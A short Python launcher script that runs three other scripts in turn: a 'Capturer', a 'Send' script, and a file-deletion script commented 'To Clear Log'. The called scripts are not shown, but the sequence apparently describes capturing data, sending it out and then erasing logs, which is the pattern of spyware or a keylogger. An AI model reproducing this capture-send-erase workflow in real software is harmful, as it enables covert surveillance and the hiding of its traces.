import sys
import subprocess
import time

if __name__ == "__main__":
    # Run Capturer Script
    subprocess.call("python Capturer.py", shell=True)
    time.sleep(3)

    # Run Send Script
    subprocess.call("python Send.py", shell=True)
    time.sleep(3)

    # Run Delete Files Script (To Clear Log)
    subprocess.call("python deleteFile.py", shell=True)
    time.sleep(3)

sys.exit()